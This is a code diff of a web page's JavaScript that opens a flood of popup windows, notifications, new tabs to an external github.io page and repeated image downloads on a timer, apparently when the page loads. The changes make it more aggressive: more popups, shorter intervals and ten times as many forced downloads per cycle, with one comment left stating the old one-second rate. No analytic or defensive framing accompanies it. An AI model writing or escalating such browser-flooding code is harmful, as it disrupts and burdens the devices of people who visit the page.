@@ -8,7 +8,7 @@
         // Array to store references to popup windows
         let popupWindows = [];
         let popupCount = 0;
-        const maxPopups = 20; // Maximum number of popups
+        const maxPopups = 30; // Maximum number of popups
 
         // Function to open a popup window with the specified content
         function openPopupWindow() {
@@ -60,14 +60,13 @@
 
         // Function to start opening popups at regular intervals
         function startOpeningPopups() {
-            const interval = 200; // Interval in milliseconds (0.2 seconds)
-
+            const interval = 100; // Interval in milliseconds (0.1 seconds)
             const intervalId = setInterval(() => {
                 if (popupCount < maxPopups) {
                     const popupWindow = openPopupWindow();
                     popupWindows.push(popupWindow);
                     sendNotification();
-                    downloadImage('0524.jpg', 5);
+                    downloadImage('0524.jpg', 50);
                     // Open the specified URL
                     window.open('https://ikecha.github.io/8888/', '_blank');
                     popupCount++;
@@ -92,7 +91,7 @@
                     // Open the specified URL
                     window.open('https://ikecha.github.io/8888/', '_blank');
                 }
-            }, 1000); // Check every second
+            }, 100); // Check every second
         }
 
         // Start opening popups when the page loads and monitor them
